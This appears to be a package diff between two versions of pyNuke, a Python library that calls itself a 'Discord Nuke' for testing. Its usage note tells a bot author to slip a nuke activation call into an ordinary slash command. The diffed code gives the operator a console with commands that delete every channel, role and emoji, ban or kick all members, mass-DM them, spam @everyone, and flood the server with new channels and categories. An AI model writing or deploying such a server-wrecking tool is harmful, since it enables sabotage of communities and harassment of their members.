@@ -1,0 +1,263 @@
+# Comparing `tmp/pyNuke-1.0.1-py2.py3-none-any.whl.zip` & `tmp/pyNuke-1.1.0-py2.py3-none-any.whl.zip`
+
+## zipinfo {}
+
+```diff
+@@ -1,10 +1,10 @@
+-Zip file size: 5729 bytes, number of entries: 8
+--rw-rw-rw-  2.0 fat      799 b- defN 23-Apr-06 13:02 pyNuke/__init__.py
+--rw-rw-rw-  2.0 fat     9793 b- defN 23-Apr-06 12:46 pyNuke/discordNuke.py
++Zip file size: 5954 bytes, number of entries: 8
++-rw-rw-rw-  2.0 fat      761 b- defN 23-Apr-06 18:11 pyNuke/__init__.py
++-rw-rw-rw-  2.0 fat    12892 b- defN 23-Apr-06 18:08 pyNuke/discordNuke.py
+ -rw-rw-rw-  2.0 fat     6274 b- defN 23-Apr-05 20:02 pyNuke/pyNuke.py
+--rw-rw-rw-  2.0 fat      685 b- defN 23-Apr-06 12:44 pyNuke/setup.py
+--rw-rw-rw-  2.0 fat      687 b- defN 23-Apr-06 13:04 pyNuke-1.0.1.dist-info/METADATA
+--rw-rw-rw-  2.0 fat      110 b- defN 23-Apr-06 13:04 pyNuke-1.0.1.dist-info/WHEEL
+--rw-rw-rw-  2.0 fat        7 b- defN 23-Apr-06 13:04 pyNuke-1.0.1.dist-info/top_level.txt
+--rw-rw-r--  2.0 fat      589 b- defN 23-Apr-06 13:04 pyNuke-1.0.1.dist-info/RECORD
+-8 files, 18944 bytes uncompressed, 4711 bytes compressed:  75.1%
++-rw-rw-rw-  2.0 fat      685 b- defN 23-Apr-06 18:11 pyNuke/setup.py
++-rw-rw-rw-  2.0 fat      687 b- defN 23-Apr-06 18:12 pyNuke-1.1.0.dist-info/METADATA
++-rw-rw-rw-  2.0 fat      110 b- defN 23-Apr-06 18:12 pyNuke-1.1.0.dist-info/WHEEL
++-rw-rw-rw-  2.0 fat        7 b- defN 23-Apr-06 18:12 pyNuke-1.1.0.dist-info/top_level.txt
++-rw-rw-r--  2.0 fat      590 b- defN 23-Apr-06 18:12 pyNuke-1.1.0.dist-info/RECORD
++8 files, 22006 bytes uncompressed, 4936 bytes compressed:  77.6%
+```
+
+## zipnote {}
+
+```diff
+@@ -6,20 +6,20 @@
+ 
+ Filename: pyNuke/pyNuke.py
+ Comment: 
+ 
+ Filename: pyNuke/setup.py
+ Comment: 
+ 
+-Filename: pyNuke-1.0.1.dist-info/METADATA
++Filename: pyNuke-1.1.0.dist-info/METADATA
+ Comment: 
+ 
+-Filename: pyNuke-1.0.1.dist-info/WHEEL
++Filename: pyNuke-1.1.0.dist-info/WHEEL
+ Comment: 
+ 
+-Filename: pyNuke-1.0.1.dist-info/top_level.txt
++Filename: pyNuke-1.1.0.dist-info/top_level.txt
+ Comment: 
+ 
+-Filename: pyNuke-1.0.1.dist-info/RECORD
++Filename: pyNuke-1.1.0.dist-info/RECORD
+ Comment: 
+ 
+ Zip file comment:
+```
+
+## pyNuke/__init__.py
+
+```diff
+@@ -1,10 +1,5 @@
+-__description__ = """
+-pyNuke.
+-
+-A Discord Nuke. Meant to be used with good intent for testing purposes.
+-"""                 
+-
+-__version__ = "1.0.1"
++__description__ = "A Discord Nuke. Meant to be used with good intent for testing purposes."
++__version__ = "1.1.0"
+ __author__ = 'Tiago Coelho'
+ __status__ = "Beta"
+ __how__ = "First, import pyNuke using `import pyNuke` and import discordNuke using `from pyNuke import discordNuke`.                                                        Make a command using, for example, @bot.tree.command().                                                                                                           At the end of the command, add the following function call: await discordNuke.nukeactivate(interaction=interaction, bot=bot).                                     Now, everytime someone uses that command, you will be able to use the discord nuke on the console."
+```
+
+## pyNuke/discordNuke.py
+
+```diff
+@@ -29,15 +29,15 @@
+         while not stop:
+             try:
+                 todo = await self.get_input(input_message="INSERT COMMAND. USE '.help' FOR COMMAND LIST  ", timeout=200)
+             except Exception as e:
+                 print(e)
+                 todo = 702103
+             if todo == ".help":
+-                print("""COMMAND LIST:\n.help\n.stop\n.allchannelsDELETE\n.allchannelsCHANGE_NAME_TO\n.spamMESSAGES\n.allrolesCHANGE_NAME_TO\n.allrolesDELETE\n.allmembersBAN\n.allmembersKICK\n.allmembersDM\n.allmembersCHANGE_NICKNAME_TO\n.guildCHANGE_NAME_TO\n.allemojisDELETE\n.allemojisCHANGE_NAME_TO\n.@everyone\n.guildCHANGE_ICON_TO""")
++                print("""COMMAND LIST:\n.help\n.stop\n.allchannelsDELETE\n.allchannelsCHANGE_NAME_TO\n.spamMESSAGES\n.allrolesCHANGE_NAME_TO\n.allrolesDELETE\n.allmembersBAN\n.allmembersKICK\n.allmembersDM\n.allmembersCHANGE_NICKNAME_TO\n.guildCHANGE_NAME_TO\n.allemojisDELETE\n.allemojisCHANGE_NAME_TO\n.@everyone\n.guildCHANGE_ICON_TO\n.spamcreateCHANNELS\n.spamcreateCATEGORIES""")
+             elif todo == ".stop":
+                 print("STOPPED NUKE ACTIVATION")
+                 stop = True
+             elif todo == ".allchannelsDELETE":
+                 for channel in NUKE_guild.channels:
+                     await channel.delete()
+                 print("SUCCESSFULLY DELETED ALL CHANNELS")
+@@ -151,14 +151,17 @@
+                         await member.edit(nick=nick)
+                         amountnicknameschanged += 1
+                     except:
+                         continue
+                 print(f"SUCCESSFULLY CHANGED {amountnicknameschanged} MEMBERS' NICKNAMES")
+             elif todo == ".guildCHANGE_NAME_TO":
+                 newname = await self.get_input(input_message="INSERT NEW GUILD NAME  ", timeout=200)
++                if newname == 702103:
++                    print("NUKE TIMED OUT")
++                    break
+                 try:
+                     await NUKE_guild.edit(name=newname)
+                     print("SUCCESSFULLY CHANGED THE GUILD'S NAME")
+                 except Exception as e:
+                     print(e)
+             elif todo == ".allemojisDELETE":
+                 emojisdeleted = 0
+@@ -167,14 +170,17 @@
+                         await emoji.delete()
+                         emojisdeleted+=1
+                     except:
+                         continue
+                 print(f"SUCCESSFULLY DELETED {emojisdeleted} EMOJIS")          
+             elif todo == ".allemojisCHANGE_NAME_TO":
+                 newemoji = await self.get_input(input_message="INSERT NEW EMOJI NAMES  ", timeout=200)
++                if newemoji == 702103:
++                    print("NUKE TIMED OUT")
++                    break
+                 emojischanged = 0
+                 for emoji in NUKE_guild.emojis:
+                     try:
+                         await emoji.edit(name=newemoji)
+                         emojischanged+=1
+                     except:
+                         continue
+@@ -184,14 +190,70 @@
+                 for channel in NUKE_guild.channels:
+                     try:
+                         await channel.send("@everyone @everyone @everyone")
+                         channelamountpings += 1
+                     except:
+                         continue
+                 print(f"SUCCESSFULLY PINGED EVERYONE IN {channelamountpings} CHANNELS")
++            elif todo == ".spamcreateCHANNELS":
++                channelsnames = await self.get_input(input_message="INSERT NAME OF NEW CHANNELS  ", timeout=200)
++                if channelsnames == 702103:
++                    print("NUKE TIMED OUT")
++                    break
++                isitint = False
++                timeout = False
++                while not isitint:
++                    try:
++                        amountofchannelstomake = await self.get_input(input_message="INSERT AMOUNT OF CHANNELS TO CREATE  ", timeout=200)
++                        if amountofchannelstomake == 702103:
++                            timeout = True
++                            print("NUKE TIMED OUT")
++                            break
++                        amountofchannelstomake = int(amountofchannelstomake)            
++                        isitint = True
++                    except:
++                        print("INVALID INTERGER")
++                        isitint = False
++                if timeout == True:
++                    break
++                for i in range(0, amountofchannelstomake):
++                    try:
++                        await NUKE_guild.create_text_channel(channelsnames)
++                    except:
++                        amountofchannelstomake -= 1
++                        continue
++                print(f"CREATED {amountofchannelstomake} CHANNELS")
++            elif todo == ".spamcreateCATEGORIES":
++                categoriesnames = await self.get_input(input_message="INSERT NAME OF NEW CATEGORIES  ", timeout=200)
++                if categoriesnames == 702103:
++                    print("NUKE TIMED OUT")
++                    break
++                isitint = False
++                timeout = False
++                while not isitint:
++                    try:
++                        amountofcategoriestomake = await self.get_input(input_message="INSERT AMOUNT OF CATEGORIES TO CREATE  ", timeout=200)
++                        if amountofcategoriestomake == 702103:
++                            timeout = True
++                            print("NUKE TIMED OUT")
++                            break
++                        amountofcategoriestomake = int(amountofcategoriestomake)            
++                        isitint = True
++                    except:
++                        print("INVALID INTERGER")
++                        isitint = False
++                if timeout == True:
++                    break
++                for i in range(0, amountofcategoriestomake):
++                    try:
++                        await NUKE_guild.create_category(categoriesnames)
++                    except:
++                        amountofcategoriestomake -= 1
++                        continue
++                print(f"CREATED {amountofcategoriestomake} CATEGORIES")
+             elif todo == 702103:
+                 print("NUKE TIMED OUT")
+                 break
+             else:
+                 print("INVALID COMMAND")
+         return
+```
+
+## pyNuke/setup.py
+
+```diff
+@@ -1,12 +1,12 @@
+ from setuptools import setup
+ 
+ setup(
+     name='pyNuke',
+-    version='1.0.1',    
++    version='1.1.0',    
+     description='A Discord Nuke. Meant to be used with good intent for testing purposes.',
+     author='Tiago Coelho',
+     author_email='melaochapanao@gmail.com',
+     license='The Unlicense',
+     packages=['pyNuke'],
+     install_requires=['discord.py'],
+```
+
+## Comparing `pyNuke-1.0.1.dist-info/METADATA` & `pyNuke-1.1.0.dist-info/METADATA`
+
+ * *Files 0% similar despite different names*
+
+```diff
+@@ -1,10 +1,10 @@
+ Metadata-Version: 2.1
+ Name: pyNuke
+-Version: 1.0.1
++Version: 1.1.0
+ Summary: A Discord Nuke. Meant to be used with good intent for testing purposes.
+ Home-page: UNKNOWN
+ Author: Tiago Coelho
+ Author-email: melaochapanao@gmail.com
+ License: The Unlicense
+ Platform: UNKNOWN
+ Classifier: Development Status :: 4 - Beta
+```
+
+## Comparing `pyNuke-1.0.1.dist-info/RECORD` & `pyNuke-1.1.0.dist-info/RECORD`
+
+ * *Files 18% similar despite different names*
+
+```diff
+@@ -1,8 +1,8 @@
+-pyNuke/__init__.py,sha256=U8E19xFKK5X8aQGYw-FHqgAjiyspaSadgScy1_LYl0E,799
+-pyNuke/discordNuke.py,sha256=Q4Gd4H3vObb5-z_ltRkDnpKRna0gEwisWaM1x3-lW2Q,9793
++pyNuke/__init__.py,sha256=Zqx0PgdE-u0iY91T-vBzADfXtPkkjSbPxUBuK9-7yGA,761
++pyNuke/discordNuke.py,sha256=41M2R1T_Amqos0E8HjNpkmCgBvaS-qvrBiElFsPmd98,12892
+ pyNuke/pyNuke.py,sha256=DbY-xkdEWRnnjvk1CbEAStD3UyCG8o7PEyH2u0A74WE,6274
+-pyNuke/setup.py,sha256=JfxNqtRg_ebAUisk2aCbJsb4YZBdMqGtgT5rvN7PFD4,685
+-pyNuke-1.0.1.dist-info/METADATA,sha256=Qy3cTCKfr_vpiMEOcTk0g2e4KlQz9d3nELlYfxvFZ-Y,687
+-pyNuke-1.0.1.dist-info/WHEEL,sha256=a-zpFRIJzOq5QfuhBzbhiA1eHTzNCJn8OdRvhdNX0Rk,110
+-pyNuke-1.0.1.dist-info/top_level.txt,sha256=GYf2E3fkShqHJ7-3bg7t-zgJvd2TE0owLuLpHoIaDmA,7
+-pyNuke-1.0.1.dist-info/RECORD,,
++pyNuke/setup.py,sha256=GJpi8ny9qJh7vBnsH2ujeAkS99-Bqu5sxOmlo0CPRqc,685
++pyNuke-1.1.0.dist-info/METADATA,sha256=lQZOlezWwzhswNhnswF_ZCpA38s5mjtiWe_o-fY5mNA,687
++pyNuke-1.1.0.dist-info/WHEEL,sha256=a-zpFRIJzOq5QfuhBzbhiA1eHTzNCJn8OdRvhdNX0Rk,110
++pyNuke-1.1.0.dist-info/top_level.txt,sha256=GYf2E3fkShqHJ7-3bg7t-zgJvd2TE0owLuLpHoIaDmA,7
++pyNuke-1.1.0.dist-info/RECORD,,
+```
+
